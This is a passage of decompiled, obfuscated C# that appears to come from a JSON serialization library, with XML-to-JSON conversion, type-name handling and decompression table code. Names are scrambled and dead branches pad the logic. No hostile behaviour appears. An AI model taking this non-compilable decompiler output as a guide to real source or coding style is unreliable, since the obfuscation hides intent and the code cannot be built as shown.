                _param1.\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001(_param2 as \u000F.\u0001, _param2.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9760), (IFormatProvider) \u0098.\u0002\u0004(), (object) str3, (object) \u0001\u0002.\u007E\u0017\u0004(_param5))), (Exception) null);
label_12:
              return true;
            }
            if (\u008E\u0002.\u0007\u0006(str2, \u0014.\u0006.\u0082(9813), StringComparison.Ordinal))
            {
              \u0014.\u0006.\u0001(_param2);
              \u0014.\u0006.\u0001(global::\u0001.\u007E\u0001(_param2.\u0001()), _param3, _param1, ref _param8, ref obj9, _param7, _param0, _param2);
              if (true)
              {
                \u0014.\u0006.\u0001(_param2);
                flag = true;
                goto label_22;
              }
            }
            else if (\u008E\u0002.\u0007\u0006(str2, \u0014.\u0006.\u0082(9822), StringComparison.Ordinal))
            {
              \u0014.\u0006.\u0001(_param2);
              _param4 = _param2.\u0001() != null ? global::\u0001.\u007E\u0001(_param2.\u0001()) : (string) null;
              \u0014.\u0006.\u0001(_param2);
              flag = true;
              goto label_22;
            }
            else if (\u008E\u0002.\u0007\u0006(str2, \u0014.\u0006.\u0082(9827), StringComparison.Ordinal))
            {
              \u0014.\u0006.\u0001(_param2);
              object obj = \u0014.\u0006.\u0001(_param1, _param2, _param8, obj9, _param3, _param6, _param4);
              \u0014.\u0006.\u0001(_param2);
              _param5 = obj;
              return true;
            }
            flag = false;
label_22:;
          }
          while (flag && _param2.\u0001() == JsonToken.PropertyName);
        }
      }
      return false;
    }

    static void \u0001([In] System.Type obj0, [In] JsonWriter obj1, [In] \u0010.\u0006 obj2)
    {
      FormatterAssemblyStyle formatterAssemblyStyle = ((\u0016.\u0008) obj2).\u0001.\u0001;
      SerializationBinder serializationBinder = ((\u0016.\u0008) obj2).\u0001.\u0001;
      string str = \u0014.\u0006.\u0001(formatterAssemblyStyle, obj0, serializationBinder);
      if (((\u0016.\u0008) obj2).\u0001 != null && ((\u0016.\u0008) obj2).\u0001.\u0001() >= TraceLevel.Verbose)
        ((\u0016.\u0008) obj2).\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj1), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9840), (IFormatProvider) \u0098.\u0002\u0004(), (object) str, (object) obj0)), (Exception) null);
      if (false)
        return;
      obj1.\u0001(\u0014.\u0006.\u0082(9813), false);
      obj1.\u0004(str);
    }

    static \u0004.\u0010 \u0001([In] \u0012.\u0007 obj0)
    {
      StringWriter stringWriter = new StringWriter((IFormatProvider) \u0098.\u0002\u0004());
      \u0004.\u0010 obj1;
      try
      {
        \u0005.\u0004 obj2 = new \u0005.\u0004((TextWriter) stringWriter);
label_2:
        try
        {
          if (true)
            goto label_5;
label_3:
          do
          {
            if (true)
              obj1 = new \u0004.\u0010((object) global::\u0001.\u007E\u0001((object) stringWriter));
            else
              goto label_2;
          }
          while (false);
          goto label_13;
label_5:
          \u0014.\u0006.\u0001(obj0, (JsonWriter) obj2);
          goto label_3;
        }
        finally
        {
          if (obj2 != null)
            global::\u0011.\u007E\u0007\u0002((object) obj2);
        }
      }
      finally
      {
        if (stringWriter == null)
          goto label_11;
label_10:
        global::\u0011.\u007E\u0007\u0002((object) stringWriter);
label_11:
        if (false)
          goto label_10;
      }
label_13:
      return obj1;
    }

    static void \u0001(
      [In] object obj0,
      [In] JsonSerializerInternalReader obj1,
      [In] \u0016.\u0007 obj2,
      [In] string obj3,
      [In] \u0012.\u0007 obj4)
    {
      try
      {
        throw \u0014.\u0006.\u0001(obj4, obj3);
      }
      catch (Exception ex)
      {
        if (\u0014.\u0006.\u0001(obj4.\u0001(), obj0, (object) null, ex, obj4 as \u000F.\u0001, obj2, (\u0016.\u0008) obj1))
          \u0014.\u0006.\u0001(obj4, obj1, 0, false);
        else
          throw;
      }
    }

    static bool \u0001([In] object obj0, [In] \u0004.\u0011 obj1)
    {
      int num;
      if (obj0 is IEnumerable)
      {
        while (!(obj0 is string))
        {
          if (true)
          {
            if (!(obj0 is \u0015.\u0013))
            {
              num = obj0 is byte[] ? 1 : 0;
              goto label_4;
            }
            else
              break;
          }
        }
        goto label_5;
      }
      else
        goto label_5;
label_4:
      return num == 0;
label_5:
      num = 0;
      if (num == 0)
        return num != 0;
      goto label_4;
    }

    static void \u0001([In] JsonWriter obj0, [In] \u000E.\u0001 obj1)
    {
      if (obj1 >= \u000E.\u0001.\u0001)
      {
        while (obj1 <= \u000E.\u0001.\u0002)
        {
          do
          {
            obj0.\u0001 = obj1;
          }
          while (false);
          if (true)
            return;
        }
      }
      throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(4207));
    }

    static int \u0001([In] \u0013.\u000F.\u0002 obj0, [In] int obj1)
    {
      while (obj0.\u0003 < obj1)
      {
        if (obj0.\u0001 == obj0.\u0002)
        {
          if (true)
          {
            if (true)
              return -1;
          }
          else
            break;
        }
        else if (true)
        {
          \u0013.\u000F.\u0002 obj2 = obj0;
          int num1 = (int) obj2.\u0001;
          byte[] numArray1 = obj0.\u0001;
          \u0013.\u000F.\u0002 obj3 = obj0;
          int num2;
          int num3 = num2 = obj3.\u0001;
          obj3.\u0001 = num2 + 1;
          int index1 = num3;
          int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
          byte[] numArray2 = obj0.\u0001;
          \u0013.\u000F.\u0002 obj4 = obj0;
          int num5;
          int num6 = num5 = obj4.\u0001;
          obj4.\u0001 = num5 + 1;
          int index2 = num6;
          int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
          int num8 = (num4 | num7) << obj0.\u0003;
          obj2.\u0001 = (uint) (num1 | num8);
        }
        else
          continue;
        obj0.\u0003 += 16;
        break;
      }
      long num9 = (long) obj0.\u0001;
      int num10 = 1;
      int num11 = obj1;
      int num12;
      do
      {
        if (true)
        {
          int num13 = num11 & 31;
          num12 = num10 << num13;
          if (true)
          {
            num11 = 1;
            num10 = num12;
          }
          else
            goto label_15;
        }
      }
      while (num11 == 0);
      int num14 = num10 - num11;
      goto label_13;
label_15:
      num14 = num12;
label_13:
      long num15 = (long) num14;
      return (int) (num9 & num15);
    }

    static void \u0001(
      [In] XmlNodeConverter obj0,
      [In] JsonWriter obj1,
      [In] IXmlNode obj2,
      [In] XmlNamespaceManager obj3,
      [In] bool obj4)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      XmlNodeConverter.\u0001 obj5 = new XmlNodeConverter.\u0001();
      // ISSUE: reference to a compiler-generated field
      obj5.\u0001 = obj2;
      int index;
      int num1;
      // ISSUE: reference to a compiler-generated field
      switch (obj5.\u0001.\u0001())
      {
        case XmlNodeType.Element:
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated field
          if (\u0014.\u0006.\u0001(obj0, obj5.\u0001) && obj5.\u0001.\u0001().All<IXmlNode>(new Func<IXmlNode, bool>(obj5.\u0001)) && obj5.\u0001.\u0001().Count > 0)
          {
            // ISSUE: reference to a compiler-generated field
            obj0.\u0001(obj1, obj5.\u0001, obj3, false);
            return;
          }
          global::\u0011.\u007E\u0015\u0002((object) obj3);
          // ISSUE: reference to a compiler-generated field
          IEnumerator<IXmlNode> enumerator = obj5.\u0001.\u0002().GetEnumerator();
          try
          {
            while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
            {
              IXmlNode current = enumerator.Current;
              if (\u0007\u0002.\u008C\u0004(current.\u0003(), \u0014.\u0006.\u0082(9885)))
              {
                string str1;
                if (true)
                {
                  if (\u0007\u0002.\u008B\u0004(current.\u0001(), \u0014.\u0006.\u0082(9926)))
                  {
                    str1 = \u001B.\u0003\u0003(current.\u0001());
                    goto label_10;
                  }
                }
                else
                  goto label_11;
label_8:
                str1 = string.Empty;
label_10:
                string str2 = str1;
label_11:
                string str3 = current.\u0002();
                if (true)
                  \u0017\u0003.\u007E\u0001\u0007((object) obj3, str2, str3);
                else
                  goto label_8;
              }
            }
          }
          finally
          {
            if (enumerator != null)
              global::\u0011.\u007E\u0007\u0002((object) enumerator);
          }
          if (obj4)
          {
            // ISSUE: reference to a compiler-generated field
            obj1.\u0002(\u0014.\u0006.\u0001(obj3, obj5.\u0001, obj0));
          }
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          if (\u0014.\u0006.\u0001(obj0, (IEnumerable<IXmlNode>) obj5.\u0001.\u0002()).Any<IXmlNode>() || obj5.\u0001.\u0001().Count != 1)
            goto label_23;
label_20:
          // ISSUE: reference to a compiler-generated field
          if (obj5.\u0001.\u0001()[0].\u0001() == XmlNodeType.Text)
          {
            // ISSUE: reference to a compiler-generated field
            obj1.\u0004(obj5.\u0001.\u0001()[0].\u0002());
            goto label_35;
          }
label_23:
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          if (obj5.\u0001.\u0001().Count == 0 && \u000E.\u0008.\u0001<IXmlNode>((ICollection<IXmlNode>) obj5.\u0001.\u0002()))
          {
            // ISSUE: reference to a compiler-generated field
            if (((\u0002.\u0006) obj5.\u0001).\u0001())
            {
              obj1.\u0008();
              goto label_35;
            }
            else if (true)
            {
              obj1.\u0004(string.Empty);
              goto label_35;
            }
            else
              goto label_40;
          }
          else
          {
            if (false)
              return;
            obj1.\u0002();
            if (true)
            {
              index = 0;
              break;
            }
            goto label_20;
          }
        case XmlNodeType.Attribute:
        case XmlNodeType.Text:
        case XmlNodeType.CDATA:
        case XmlNodeType.ProcessingInstruction:
        case XmlNodeType.Whitespace:
        case XmlNodeType.SignificantWhitespace:
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          if (\u0007\u0002.\u008C\u0004(obj5.\u0001.\u0003(), \u0014.\u0006.\u0082(9885)) && \u0007\u0002.\u008C\u0004(obj5.\u0001.\u0002(), \u0014.\u0006.\u0082(9935)) || \u0007\u0002.\u008C\u0004(obj5.\u0001.\u0003(), \u0014.\u0006.\u0082(9935)) && \u0007\u0002.\u008C\u0004(obj5.\u0001.\u0001(), \u0014.\u0006.\u0082(9992)))
            return;
          goto label_40;
        case XmlNodeType.Comment:
          if (obj4)
          {
            // ISSUE: reference to a compiler-generated field
            obj1.\u0005(obj5.\u0001.\u0002());
            return;
          }
          if (true)
            return;
          goto label_35;
        case XmlNodeType.Document:
        case XmlNodeType.DocumentFragment:
          // ISSUE: reference to a compiler-generated field
          obj0.\u0001(obj1, obj5.\u0001, obj3, obj4);
          return;
        case XmlNodeType.DocumentType:
          // ISSUE: reference to a compiler-generated field
          \u0016.\u0010 obj6 = (\u0016.\u0010) obj5.\u0001;
          // ISSUE: reference to a compiler-generated field
          obj1.\u0002(\u0014.\u0006.\u0001(obj3, obj5.\u0001, obj0));
          obj1.\u0002();
          if (!global::\u0007.\u009E(obj6.\u0004()))
          {
            obj1.\u0002(\u0014.\u0006.\u0082(10044));
            obj1.\u0004(obj6.\u0004());
          }
          int num2 = global::\u0007.\u009E(obj6.\u0006()) ? 1 : 0;
          if (false)
          {
            num1 = num2;
            goto label_33;
          }
          else
          {
            if (num2 == 0)
            {
              obj1.\u0002(\u0014.\u0006.\u0082(10053));
              obj1.\u0004(obj6.\u0006());
            }
            if (!global::\u0007.\u009E(obj6.\u0005()))
            {
              obj1.\u0002(\u0014.\u0006.\u0082(10066));
              obj1.\u0004(obj6.\u0005());
            }
            if (!global::\u0007.\u009E(obj6.\u0007()))
            {
              obj1.\u0002(\u0014.\u0006.\u0082(10079));
              obj1.\u0004(obj6.\u0007());
            }
            obj1.\u0011();
            return;
          }
        case XmlNodeType.XmlDeclaration:
          // ISSUE: reference to a compiler-generated field
          \u0012.\u0016 obj7 = (\u0012.\u0016) obj5.\u0001;
          // ISSUE: reference to a compiler-generated field
          obj1.\u0002(\u0014.\u0006.\u0001(obj3, obj5.\u0001, obj0));
          obj1.\u0002();
          if (!global::\u0007.\u009E(obj7.\u0004()))
          {
            obj1.\u0002(\u0014.\u0006.\u0082(10001));
            obj1.\u0004(obj7.\u0004());
          }
          if (!global::\u0007.\u009E(obj7.\u0005()))
          {
            obj1.\u0002(\u0014.\u0006.\u0082(10014));
            obj1.\u0004(obj7.\u0005());
          }
          if (!global::\u0007.\u009E(obj7.\u0006()))
          {
            obj1.\u0002(\u0014.\u0006.\u0082(10027));
            obj1.\u0004(obj7.\u0006());
          }
          obj1.\u0011();
          return;
        default:
          // ISSUE: reference to a compiler-generated field
          throw new JsonSerializationException(\u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(10100), (object) obj5.\u0001.\u0001()));
      }
label_32:
      num1 = index;
label_33:
      // ISSUE: reference to a compiler-generated field
      int count = obj5.\u0001.\u0002().Count;
      if (num1 < count)
      {
        // ISSUE: reference to a compiler-generated field
        \u0014.\u0006.\u0001(obj0, obj1, obj5.\u0001.\u0002()[index], obj3, true);
        ++index;
        goto label_32;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        obj0.\u0001(obj1, obj5.\u0001, obj3, true);
        obj1.\u0011();
      }
label_35:
      int num3 = \u0015\u0002.\u007E\u0016\u0005((object) obj3) ? 1 : 0;
      return;
label_40:
      if (obj4)
      {
        // ISSUE: reference to a compiler-generated field
        obj1.\u0002(\u0014.\u0006.\u0001(obj3, obj5.\u0001, obj0));
      }
      // ISSUE: reference to a compiler-generated field
      obj1.\u0004(obj5.\u0001.\u0002());
    }

    static object \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0012.\u0007 obj1,
      [In] System.Type obj2,
      [In] \u0016.\u0007 obj3,
      [In] JsonProperty obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6,
      [In] object obj7)
    {
      if (obj3 != null && obj3.\u0001 == \u0003.\u0005.\u000E)
        return (object) \u0014.\u0006.\u0001(obj1, obj3, obj0);
      do
      {
        switch (obj1.\u0001())
        {
          case JsonToken.StartObject:
            goto label_1;
          case JsonToken.StartArray:
            goto label_2;
          case JsonToken.StartConstructor:
            goto label_9;
          case JsonToken.Comment:
            continue;
          case JsonToken.Raw:
            goto label_13;
          case JsonToken.Integer:
          case JsonToken.Float:
          case JsonToken.Boolean:
          case JsonToken.Date:
          case JsonToken.Bytes:
            goto label_3;
          case JsonToken.String:
            goto label_4;
          case JsonToken.Null:
          case JsonToken.Undefined:
            goto label_10;
          default:
            goto label_14;
        }
      }
      while (obj1.\u0001());
      goto label_16;
label_1:
      return \u0014.\u0006.\u0001(obj0, obj1, obj2, obj3, obj4, obj5, obj6, obj7);
label_2:
      return \u0014.\u0006.\u0001(obj0, obj1, obj2, obj3, obj4, obj7, (string) null);
label_3:
      return \u0014.\u0006.\u0001(obj0, obj1, obj1.\u0001(), \u0098.\u0002\u0004(), obj3, obj2);
label_4:
      string str1 = (string) obj1.\u0001();
      if (\u0014.\u0006.\u0001(obj2, obj3, str1))
        return (object) null;
      // ISSUE: type reference
      return (object) obj2 == (object) \u0004\u0002.\u0084\u0004(__typeref (byte[])) ? (object) \u0003\u0002.\u0083\u0004(str1) : \u0014.\u0006.\u0001(obj0, obj1, (object) str1, \u0098.\u0002\u0004(), obj3, obj2);
label_9:
      string str2 = global::\u0001.\u007E\u0001(obj1.\u0001());
      return \u0014.\u0006.\u0001(obj0, obj1, (object) str2, \u0098.\u0002\u0004(), obj3, obj2);
label_10:
      // ISSUE: type reference
      return (object) obj2 == (object) \u0004\u0002.\u0084\u0004(__typeref (DBNull)) ? (object) DBNull.Value : \u0014.\u0006.\u0001(obj0, obj1, obj1.\u0001(), \u0098.\u0002\u0004(), obj3, obj2);
label_13:
      return (object) new \u0004.\u0010((object) (string) obj1.\u0001());
label_14:
      throw \u0014.\u0006.\u0001(obj1, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(10165), (object) obj1.\u0001()));
label_16:
      throw \u0014.\u0006.\u0001(obj1, \u0014.\u0006.\u0082(10226));
    }

    static unsafe int \u0001([In] int obj0, [In] byte[] obj1, [In] \u0013.\u000F.\u0001 obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      do
      {
        num1 = obj2.\u0001;
        num2 = 11;
        if (num2 != 0)
        {
          if (num1 != num2)
            goto label_8;
label_3:
          if (!\u0014.\u0006.\u0001(obj2))
          {
            int num3 = obj2.\u0001.\u0002;
            num2 = 0;
            num1 = num3;
            goto label_5;
          }
          else
            continue;
label_8:
          *(int*) ((IntPtr) voidPtr + 4) = \u0014.\u0006.\u0001(obj3, obj0, obj2.\u0001, obj1);
          obj0 += *(int*) ((IntPtr) voidPtr + 4);
          *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
          obj3 -= *(int*) ((IntPtr) voidPtr + 4);
          if (obj3 != 0)
            goto label_3;
          else
            goto label_2;
        }
label_5:;
      }
      while (num1 > num2 && obj2.\u0001 != 11);
      goto label_6;
label_2:
      return *(int*) voidPtr;
label_6:
      return *(int*) voidPtr;
    }

    static \u0015.\u0013 \u0001([In] \u0015.\u0013 obj0) => obj0.\u0002;

    static int \u0001([In] \u0013.\u000F.\u0002 obj0)
    {
      int num1 = obj0.\u0002;
      int num2;
      int num3;
      while (true)
      {
        num2 = obj0.\u0001;
        if (true)
        {
          num3 = num1 - num2;
          if (false)
            num1 = num3;
          else
            goto label_7;
        }
        else
          break;
      }
label_2:
      do
      {
        if (true)
          num2 >>= 3;
      }
      while (false);
      return num1 + num2;
label_7:
      num2 = obj0.\u0003;
      num1 = num3;
      goto label_2;
    }

    static Regex \u0001([In] \u0016.\u0003 obj0, [In] \u0007.\u0004 obj1, [In] \u0012.\u0007 obj2)
    {
      string pattern = (string) null;
      RegexOptions? nullable = new RegexOptions?();
      while (obj2.\u0001())
      {
        int num = (int) obj2.\u0001();
        JsonToken jsonToken;
        if (true)
          jsonToken = (JsonToken) num;
        switch (jsonToken)
        {
          case JsonToken.PropertyName:
            string str = global::\u0001.\u007E\u0001(obj2.\u0001());
            if (!obj2.\u0001())
              throw \u0014.\u0006.\u0001(obj2, \u0014.\u0006.\u0082(10283));
            if (\u008E\u0002.\u0007\u0006(str, \u0014.\u0006.\u0082(10332), StringComparison.OrdinalIgnoreCase))
            {
              pattern = (string) obj2.\u0001();
              continue;
            }
            if (\u008E\u0002.\u0007\u0006(str, \u0014.\u0006.\u0082(10345), StringComparison.OrdinalIgnoreCase))
            {
              nullable = new RegexOptions?(obj0.\u0001<RegexOptions>(obj2));
              continue;
            }
            \u0014.\u0006.\u0001(obj2);
            continue;
          case JsonToken.EndObject:
            return pattern != null ? new Regex(pattern, (RegexOptions) ((int) nullable ?? 0)) : throw \u0014.\u0006.\u0001(obj2, \u0014.\u0006.\u0082(10358));
          default:
            continue;
        }
      }
      throw \u0014.\u0006.\u0001(obj2, \u0014.\u0006.\u0082(10283));
    }

    static unsafe bool \u0001([In] bool obj0, [In] \u0011.\u0003 obj1, [In] int obj2)
    {
      int num1 = 12;
      if (num1 == 0)
        return num1 != 0;
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(num1);
      if (obj1.\u0001)
      {
        if (true)
          return false;
      }
      else
        goto label_12;
label_6:
      if (*(int*) ((IntPtr) voidPtr + 8) != 0)
      {
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + *(int*) ((IntPtr) voidPtr + 8);
        if (*(int*) ((IntPtr) voidPtr + 4) < *(int*) voidPtr)
          goto label_13;
      }
      int num2 = *(int*) ((IntPtr) voidPtr + 4);
      if (false)
        return num2 != 0;
      int num3 = *(int*) voidPtr;
      return num2 >= num3;
label_12:
      *(int*) voidPtr = obj1.\u0002 + obj2 - obj1.\u0001 + 1;
      *(int*) ((IntPtr) voidPtr + 4) = 0;
label_13:
      *(int*) ((IntPtr) voidPtr + 8) = \u0014.\u0006.\u0001(obj1, obj0, *(int*) voidPtr - *(int*) ((IntPtr) voidPtr + 4));
      goto label_6;
    }

    static void \u0001([In] \u0004.\u0011 obj0, [In] \u0012.\u0007 obj1, [In] \u000F.\u0007 obj2)
    {
      int num = obj1.\u0001();
      if (!obj1.\u0001())
        throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(10419), (IFormatProvider) \u0098.\u0002\u0004(), (object) global::\u0001.\u007E\u000E((object) \u0001\u0002.\u0017\u0004((object) obj0))));
      \u0014.\u0006.\u0001(obj0, obj1, obj2);
      if (obj1.\u0001() > num)
        throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(10468), (IFormatProvider) \u0098.\u0002\u0004(), (object) global::\u0001.\u007E\u000E((object) \u0001\u0002.\u0017\u0004((object) obj0))));
    }

    static bool \u0001([In] System.Type obj0, [In] bool obj1)
    {
      do
      {
        if (true)
          goto label_6;
label_1:
        if (true)
          continue;
        goto label_7;
label_6:
        \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(8396));
        if (!\u0015.\u000E.\u000E(obj0))
          goto label_7;
        else
          goto label_1;
      }
      while (false);
      return true;
label_7:
      int num = \u0014.\u0006.\u0001(obj0, obj1) != null ? 1 : 0;
      return false ? num != 0 : num != 0;
    }

    static unsafe bool \u0001([In] double obj0, [In] double obj1)
    {
      do
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(16);
        double num1 = obj0;
        double num2 = obj1;
label_3:
        if (num1 == num2)
          return true;
        *(double*) voidPtr = (\u0018\u0003.\u0002\u0007(obj0) + \u0018\u0003.\u0002\u0007(obj1) + 10.0) * 2.2204460492503131E-16;
        do
        {
          *(double*) ((IntPtr) voidPtr + 8) = obj0 - obj1;
        }
        while (false);
        if (true)
        {
          double num3 = -*(double*) voidPtr;
          double num4;
          for (double num5 = *(double*) ((IntPtr) voidPtr + 8); num3 < num5; num3 = num4)
          {
            num4 = *(double*) voidPtr;
            double num6 = *(double*) ((IntPtr) voidPtr + 8);
            if (false)
            {
              num2 = num6;
              num1 = num4;
              goto label_3;
            }
            else if (false)
            {
              num2 = num6;
              num1 = num4;
              goto label_3;
            }
            else
            {
              if (true)
                return num4 > num6;
              num5 = num6;
            }
          }
        }
      }
      while (false);
      return false;
    }

    static unsafe void \u0001([In] \u0013.\u000F.\u0004 obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(68);
      int[] numArray1 = new int[16];
      int[] numArray2 = new int[16];
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < obj1.Length)
      {
        *(int*) ((IntPtr) voidPtr + 4) = (int) obj1[*(int*) voidPtr];
        if (*(int*) ((IntPtr) voidPtr + 4) > 0)
          goto label_25;
label_1:
        *(int*) voidPtr = *(int*) voidPtr + 1;
        continue;
label_25:
        ++numArray1[*(int*) ((IntPtr) voidPtr + 4)];
        goto label_1;
      }
      do
      {
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        *(int*) ((IntPtr) voidPtr + 12) = 512;
        *(int*) ((IntPtr) voidPtr + 16) = 1;
      }
      while (false);
      while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
      {
        numArray2[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
        if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 20) = numArray2[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
          *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
        }
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
      }
      obj0.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
      *(int*) ((IntPtr) voidPtr + 28) = 512;
      *(int*) ((IntPtr) voidPtr + 32) = 15;
      while (*(int*) ((IntPtr) voidPtr + 32) >= 10)
      {
        *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
        *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
        while (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
        {
          obj0.\u0001[(int) \u0014.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
          *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
          *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
        }
        *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
      }
      *(int*) ((IntPtr) voidPtr + 48) = 0;
      while (*(int*) ((IntPtr) voidPtr + 48) < obj1.Length)
      {
        *(int*) ((IntPtr) voidPtr + 52) = (int) obj1[*(int*) ((IntPtr) voidPtr + 48)];
        if (*(int*) ((IntPtr) voidPtr + 52) != 0)
        {
          *(int*) ((IntPtr) voidPtr + 8) = numArray2[*(int*) ((IntPtr) voidPtr + 52)];
          *(int*) ((IntPtr) voidPtr + 56) = (int) \u0014.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 8));
          if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
          {
            do
            {
              obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
              *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
            }
            while (*(int*) ((IntPtr) voidPtr + 56) < 512);
          }
          else
          {
            *(int*) ((IntPtr) voidPtr + 60) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
            *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
            *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
            do
            {
              obj0.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
              *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
            }
            while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
          }
          numArray2[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
        }
        *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
      }
    }

    static \u0004.\u0004 \u0001([In] System.Type obj0, [In] bool obj1)
    {
      \u0013.\u0001 obj = JsonTypeReflector.\u0001<\u0013.\u0001>((object) obj0);
label_9:
      if (obj == null)
        goto label_11;
label_1:
      if (true)
      {
        if (true)
          return obj.\u0001;
      }
      else
        goto label_9;
label_5:
      if (true)
      {
        if (JsonTypeReflector.\u0001<SerializableAttribute>((object) obj0) != null)
          return \u0004.\u0004.\u0003;
      }
      else
        goto label_11;
label_7:
      if (true)
        return \u0004.\u0004.\u0001;
label_11:
      if (\u0014.\u0006.\u0001(obj0) != null)
        return \u0004.\u0004.\u0002;
      if (true)
      {
        if (obj1)
          goto label_7;
        else
          goto label_5;
      }
      else
        goto label_1;
    }

    static bool \u0001(
      ref TimeSpan _param0,
      [Out] \u0015.\u0008 _param1,
      out DateTimeKind _param2,
      out long _param3)
    {
      if (false)
        goto label_18;
      else
        goto label_16;
label_1:
      int num1;
      int num2;
      int num3;
      if (true)
      {
        num1 = num3;
        num2 = num1;
      }
      else
        goto label_14;
label_2:
      int num4;
      if (true)
      {
        if (num2 != -1)
          goto label_6;
        else
          goto label_18;
      }
      else
        num4 = num2;
label_5:
      num1 = num4;
label_6:
      if (num1 != -1)
      {
        _param2 = DateTimeKind.Local;
        if (true)
        {
          if (!\u0014.\u0006.\u0001(ref _param0, num1 + _param1.\u0001(), _param1))
          {
            _param3 = 0L;
            return false;
          }
          goto label_13;
        }
      }
      else
        _param0 = TimeSpan.Zero;
      num2 = _param1.\u0002() - 2;
      if (true)
        num1 = num2;
      else
        goto label_2;
label_13:
      num3 = \u0014.\u0006.\u0001(_param1.\u0001(), 6 + _param1.\u0001(), num1 - 6, out _param3) == \u0011.\u0007.\u0002 ? 1 : 0;
label_14:
      if (true)
        return num3 != 0;
